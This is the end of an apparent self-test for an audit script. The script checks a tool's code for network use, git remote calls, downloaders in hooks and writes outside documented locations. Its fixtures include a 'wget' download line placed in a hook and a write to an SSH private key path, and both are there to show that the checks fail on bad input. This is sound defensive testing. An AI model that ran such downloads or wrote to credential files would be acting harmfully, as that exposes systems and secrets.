    ["a listed place that is gone fails", () => {
      const { files, readFile } = fake({ "lib/a.mjs": "const nothing = 1;\n" });
      return checkOutsideReach(files, readFile, [["lib/a.mjs", "homedir()", "somewhere"]]).some((v) => v.includes("no longer there"));
    }],
    ["a network module fails", () => {
      const { files, readFile } = fake({ "lib/a.mjs": 'import { request } from "node:https";\n' });
      return checkNetwork(files, readFile, doc).some((v) => v.includes("a network module"));
    }],
    ["a git command that contacts a remote fails", () => {
      const { files, readFile } = fake({ "hooks/x.sh": 'git fetch --all\n' });
      return checkNetwork(files, readFile, doc).some((v) => v.includes("contacts a remote"));
    }],
    ["a downloader in a hook fails", () => {
      const { files, readFile } = fake({ "hooks/x.sh": 'wget -O - https://example.invalid\n' });
      return checkNetwork(files, readFile, doc).some((v) => v.includes("the program wget"));
    }],
    ["section 4 no longer saying so fails, when nothing in the code reaches a network", () => checkNetwork({ js: [], shell: [] }, () => "", "## 4. Network\n\n- it talks to whatever it likes\n", []).some((v) => v.includes("none of its own"))],
    ["an allowed network use the page does not mention fails", () => {
      const { files, readFile } = fake({ "lib/a.mjs": 'runGit(null, ["ls-remote", url]);\n' });
      const allowed = [{ file: "lib/a.mjs", text: '"ls-remote"', docPhrase: "a sentence the page does not carry", why: "a test" }];
      return checkNetwork(files, readFile, "## 4. Network\n\n- nothing\n", allowed).some((v) => v.includes("does not say"));
    }],
    ["a write outside the listed locations fails", () => checkWrites([".ssh/id_ed25519"], ["~/.config/skilliton/trust/<company>.allowed_signers"]).some((v) => v.includes(".ssh/id_ed25519"))],
    ["a listed location nothing writes fails", () => checkWrites([], ["~/.local/bin/skilliton"]).some((v) => v.includes("wrote nothing there"))],
    ["a documented location with a name in it passes", () => !checkWrites([".config/skilliton/trust/acme.allowed_signers"], ["~/.config/skilliton/trust/<company>.allowed_signers"]).length],
    ["a folder on the way to a documented location passes", () => !checkWrites([".config", ".config/skilliton", ".config/skilliton/trust", ".config/skilliton/trust/acme.allowed_signers"], ["~/.config/skilliton/trust/<company>.allowed_signers"]).length],
  ];
  let failed = 0;
  for (const [name, fn] of cases) {
    let ok = false, error = null;
    try { ok = fn() === true; } catch (e) { error = e.message; }
    console.log(`${ok ? "ok  " : "FAIL"} ${name}${error ? `: ${error}` : ""}`);
    if (!ok) failed++;
  }
  console.log(failed ? `\nself-test FAILED: ${failed} case(s)` : `\nself-test passed: each check fails on known-bad input (${cases.length} cases)`);
  return failed ? 1 : 0;
}

process.exitCode = process.argv.includes("--self-test") ? selfTest() : main();
